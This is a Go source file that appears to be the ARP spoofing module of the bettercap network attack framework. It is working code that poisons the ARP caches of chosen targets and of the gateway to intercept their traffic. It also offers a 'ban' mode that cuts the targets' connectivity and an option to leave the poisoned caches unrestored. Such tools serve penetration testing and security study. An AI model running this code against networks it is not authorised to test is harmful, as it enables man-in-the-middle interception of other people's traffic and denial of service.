package arp_spoof

import (
	"bytes"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/malfunkt/iprange"
)

type ArpSpoofer struct {
	session.SessionModule
	addresses   []net.IP
	macs        []net.HardwareAddr
	wAddresses  []net.IP
	wMacs       []net.HardwareAddr
	fullDuplex  bool
	internal    bool
	ban         bool
	skipRestore bool
	waitGroup   *sync.WaitGroup
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	mod := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		addresses:     make([]net.IP, 0),
		macs:          make([]net.HardwareAddr, 0),
		wAddresses:    make([]net.IP, 0),
		wMacs:         make([]net.HardwareAddr, 0),
		ban:           false,
		internal:      false,
		fullDuplex:    false,
		skipRestore:   false,
		waitGroup:     &sync.WaitGroup{},
	}

	mod.SessionModule.Requires("net.recon")

	mod.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges."))

	mod.AddParam(session.NewStringParameter("arp.spoof.whitelist", "", "", "Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing."))

	mod.AddParam(session.NewBoolParameter("arp.spoof.internal",
		"false",
		"If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network."))

	mod.AddParam(session.NewBoolParameter("arp.spoof.fullduplex",
		"false",
		"If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail)."))

	noRestore := session.NewBoolParameter("arp.spoof.skip_restore",
		"false",
		"If set to true, targets arp cache won't be restored when spoofing is stopped.")

	mod.AddObservableParam(noRestore, func(v string) {
		if strings.ToLower(v) == "true" || v == "1" {
			mod.skipRestore = true
			mod.Warning("arp cache restoration after spoofing disabled")
		} else {
			mod.skipRestore = false
			mod.Debug("arp cache restoration after spoofing enabled")
		}
	})

	mod.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("arp.ban on", "",
		"Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.",
		func(args []string) error {
			mod.ban = true
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("arp.spoof off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	mod.AddHandler(session.NewModuleHandler("arp.ban off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (mod ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (mod ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (mod *ArpSpoofer) Configure() error {
	var err error
	var targets string
	var whitelist string

	if err, mod.fullDuplex = mod.BoolParam("arp.spoof.fullduplex"); err != nil {
		return err
	} else if err, mod.internal = mod.BoolParam("arp.spoof.internal"); err != nil {
		return err
	} else if err, targets = mod.StringParam("arp.spoof.targets"); err != nil {
		return err
	} else if err, whitelist = mod.StringParam("arp.spoof.whitelist"); err != nil {
		return err
	} else if mod.addresses, mod.macs, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
		return err
	} else if mod.wAddresses, mod.wMacs, err = network.ParseTargets(whitelist, mod.Session.Lan.Aliases()); err != nil {
		return err
	}

	mod.Debug(" addresses=%v macs=%v whitelisted-addresses=%v whitelisted-macs=%v", mod.addresses, mod.macs, mod.wAddresses, mod.wMacs)

	if mod.ban {
		mod.Warning("running in ban mode, forwarding not enabled!")
		mod.Session.Firewall.EnableForwarding(false)
	} else if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("enabling forwarding")
		mod.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (mod *ArpSpoofer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	nTargets := len(mod.addresses) + len(mod.macs)
	if nTargets == 0 {
		mod.Warning("list of targets is empty, module not starting.")
		return nil
	}

	return mod.SetRunning(true, func() {
		neighbours := []net.IP{}

		if mod.internal {
			list, _ := iprange.ParseList(mod.Session.Interface.CIDR())
			neighbours = list.Expand()
			nNeigh := len(neighbours) - 2

			mod.Warning("arp spoofer started targeting %d possible network neighbours of %d targets.", nNeigh, nTargets)
		} else {
			mod.Info("arp spoofer started, probing %d targets.", nTargets)
		}

		if mod.fullDuplex {
			mod.Warning("full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.")
		}

		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		gwIP := mod.Session.Gateway.IP
		myMAC := mod.Session.Interface.HW
		for mod.Running() {
			mod.arpSpoofTargets(gwIP, myMAC, true, false)
			for _, address := range neighbours {
				if !mod.Session.Skip(address) {
					mod.arpSpoofTargets(address, myMAC, true, false)
				}
			}

			time.Sleep(1 * time.Second)
		}
	})
}

func (mod *ArpSpoofer) unSpoof() error {
	if !mod.skipRestore {
		nTargets := len(mod.addresses) + len(mod.macs)
		mod.Info("restoring ARP cache of %d targets.", nTargets)
		mod.arpSpoofTargets(mod.Session.Gateway.IP, mod.Session.Gateway.HW, false, false)

		if mod.internal {
			list, _ := iprange.ParseList(mod.Session.Interface.CIDR())
			neighbours := list.Expand()
			for _, address := range neighbours {
				if !mod.Session.Skip(address) {
					if realMAC, err := mod.Session.FindMAC(address, false); err == nil {
						mod.arpSpoofTargets(address, realMAC, false, false)
					}
				}
			}
		}
	} else {
		mod.Warning("arp cache restoration is disabled")
	}

	return nil
}

func (mod *ArpSpoofer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.Info("waiting for ARP spoofer to stop ...")
		mod.unSpoof()
		mod.ban = false
		mod.waitGroup.Wait()
	})
}

func (mod *ArpSpoofer) isWhitelisted(ip string, mac net.HardwareAddr) bool {
	for _, addr := range mod.wAddresses {
		if ip == addr.String() {
			return true
		}
	}

	for _, hw := range mod.wMacs {
		if bytes.Equal(hw, mac) {
			return true
		}
	}

	return false
}

func (mod *ArpSpoofer) getTargets(probe bool) map[string]net.HardwareAddr {
	targets := make(map[string]net.HardwareAddr)

	// add targets specified by IP address
	for _, ip := range mod.addresses {
		if mod.Session.Skip(ip) {
			continue
		}
		// do we have this ip mac address?
		if hw, err := mod.Session.FindMAC(ip, probe); err == nil {
			targets[ip.String()] = hw
		}
	}
	// add targets specified by MAC address
	for _, hw := range mod.macs {
		if ip, err := network.ArpInverseLookup(mod.Session.Interface.Name(), hw.String(), false); err == nil {
			if mod.Session.Skip(net.ParseIP(ip)) {
				continue
			}
			targets[ip] = hw
		}
	}

	return targets
}

func (mod *ArpSpoofer) arpSpoofTargets(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	mod.waitGroup.Add(1)
	defer mod.waitGroup.Done()

	gwIP := mod.Session.Gateway.IP
	gwHW := mod.Session.Gateway.HW
	ourHW := mod.Session.Interface.HW
	isGW := false
	isSpoofing := false

	// are we spoofing the gateway IP?
	if net.IP.Equal(saddr, gwIP) {
		isGW = true
		// are we restoring the original MAC of the gateway?
		if !bytes.Equal(smac, gwHW) {
			isSpoofing = true
		}
	}

	if targets := mod.getTargets(probe); len(targets) == 0 {
		mod.Warning("could not find spoof targets")
	} else {
		for ip, mac := range targets {
			if check_running && !mod.Running() {
				return
			} else if mod.isWhitelisted(ip, mac) {
				mod.Debug("%s (%s) is whitelisted, skipping from spoofing loop.", ip, mac)
				continue
			} else if saddr.String() == ip {
				continue
			}

			rawIP := net.ParseIP(ip)
			if err, pkt := packets.NewARPReply(saddr, smac, rawIP, mac); err != nil {
				mod.Error("error while creating ARP spoof packet for %s: %s", ip, err)
			} else {
				mod.Debug("sending %d bytes of ARP packet to %s:%s.", len(pkt), ip, mac.String())
				mod.Session.Queue.Send(pkt)
			}

			if mod.fullDuplex && isGW {
				err := error(nil)
				gwPacket := []byte(nil)

				if isSpoofing {
					mod.Debug("telling the gw we are %s", ip)
					// we told the target we're te gateway, not let's tell the
					// gateway that we are the target
					if err, gwPacket = packets.NewARPReply(rawIP, ourHW, gwIP, gwHW); err != nil {
						mod.Error("error while creating ARP spoof packet: %s", err)
					}
				} else {
					mod.Debug("telling the gw %s is %s", ip, mac)
					// send the gateway the original MAC of the target
					if err, gwPacket = packets.NewARPReply(rawIP, mac, gwIP, gwHW); err != nil {
						mod.Error("error while creating ARP spoof packet: %s", err)
					}
				}

				if gwPacket != nil {
					mod.Debug("sending %d bytes of ARP packet to the gateway", len(gwPacket))
					if err = mod.Session.Queue.Send(gwPacket); err != nil {
						mod.Error("error while sending packet: %v", err)
					}
				}
			}
		}
	}
}
